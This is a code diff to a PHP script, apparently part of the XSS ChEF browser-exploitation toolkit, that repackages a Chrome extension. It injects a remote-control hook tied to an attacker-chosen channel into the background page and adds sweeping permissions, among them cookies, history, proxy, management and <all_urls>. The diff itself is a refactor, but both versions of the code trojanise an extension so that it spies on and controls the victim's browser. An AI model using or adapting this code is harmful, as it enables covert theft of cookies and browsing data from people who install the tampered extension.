@@ -37,31 +37,27 @@ Example:
     echo "Existing manifest: ";
     print_r($manifest);
     echo "\n";
+    $t->assertBackgroundPage($manifest, 'bckg');
     
-    if (!$manifest['background_page']) {
-        echo "Adding background page\n";
-        $manifest['background_page'] = 'bckg_.html';
-    }
-
-    $channel_prefix = $argv[3];
+    $channel_prefix = !empty($argv[3]) ? $argv[3] : "repack";
     // to be able to handle the same CRX to multiple clients
     // we need to make the channel unique, let's make it random via JS
     $channel = $channel_prefix . '"+Math.floor(Math.random()*1000000)+"';
     
-    $injected = $t->injectXssChefHook($manifest['background_page'], $argv[2], $channel);
-    
+    $injected = $t->injectXssChefHook($argv[2], $channel);
+
     echo "Adding permissions...\n";
     // add permissions required by xsschef
     $new_properties = array(
         'permissions' => array('tabs', 'proxy', '<all_urls>', 'history', 'cookies', 'management', 'plugins'),
     );
     
-    $manifest = array_merge_recursive($manifest, $new_properties);    
+    $t->setManifest(array_merge_recursive($t->getManifest(), $new_properties));    
     
     echo "Saving...\n";    
     //write
-    $t->saveFile($manifest['background_page'], $injected);
-    $t->saveManifest($manifest);
+    $t->saveFile($t->getBackgroundPage(), $injected);
+    $t->saveManifest();
     echo "Done.\n";
 } catch (Exception $e) {
     file_put_contents('php://stderr', $e->getMessage() . "\n");
